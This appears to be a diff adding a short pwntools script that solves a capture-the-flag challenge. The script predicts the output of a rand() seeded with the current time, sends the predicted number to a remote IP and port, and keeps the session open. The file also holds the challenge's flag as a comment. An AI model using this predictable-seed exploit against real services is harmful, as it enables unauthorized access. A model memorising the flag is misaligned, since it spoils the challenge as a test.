@@ -1,0 +1,17 @@
+from pwn import *
+import math
+from ctypes import CDLL
+
+libc = CDLL("libc.so.6")
+
+p = remote("103.69.97.144", 6061)
+# p = process("./race_1")
+
+now = int(math.floor(time.time()))
+libc.srand(now)
+
+payload = f"{libc.rand() % 10000 + 20230000}".encode()
+p.sendline(payload)
+
+p.interactive()
+#BKSEC{Do_nOT_T311_M3_Y0u_8RuT3F0rcE_THIs}
